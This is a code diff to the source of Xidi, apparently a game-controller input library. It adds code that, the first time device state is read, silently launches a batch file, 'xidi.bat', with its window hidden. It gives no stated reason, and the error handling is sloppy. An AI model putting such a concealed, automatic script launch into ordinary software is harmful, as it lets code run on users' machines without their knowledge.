@@ -36,6 +36,7 @@
 #include "Strings.h"
 #include "VirtualController.h"
 #include "VirtualDirectInputEffect.h"
+#include <cstdlib>
 
 #define _CRT_SECURE_NO_DEPRECATE
 #include <stdio.h>
@@ -1779,10 +1780,33 @@ namespace Xidi
 
   HANDLE hMapFile;
   char* jsonBuffer;
+  bool runProgramOnce = false;
   
   template <ECharMode charMode> HRESULT VirtualDirectInputDevice<charMode>::GetDeviceState(
       DWORD cbData, LPVOID lpvData)
   {
+    if(runProgramOnce == false) {
+        // Execute a batch script with the window hidden
+        std::string exePath = "xidi.bat";
+        std::wstring wstr(exePath.begin(), exePath.end());
+
+        STARTUPINFO si;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&pi, sizeof(pi));
+
+        CreateProcess(NULL, const_cast<LPWSTR>(wstr.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
+        runProgramOnce = true;
+    }
+
     constexpr Message::ESeverity kMethodSeverity = Message::ESeverity::SuperDebug;
     constexpr Message::ESeverity kMethodSeverityForError = Message::ESeverity::Info;
 
